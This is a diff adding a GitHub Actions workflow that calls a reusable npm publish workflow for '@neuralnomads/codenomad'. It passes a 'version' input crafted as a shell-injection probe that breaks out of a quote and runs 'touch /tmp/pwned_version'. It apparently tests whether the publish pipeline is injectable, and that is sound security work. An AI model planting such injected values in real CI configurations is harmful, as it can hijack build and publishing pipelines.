@@ -1,0 +1,11 @@
+name: argus-call-14
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/manual-npm-publish.yml
+    with:
+      ref: ""
+      version: "x\"; touch /tmp/pwned_version; ls; exit 1; #"
+      dist_tag: "dev"
+      package_name: "@neuralnomads/codenomad"
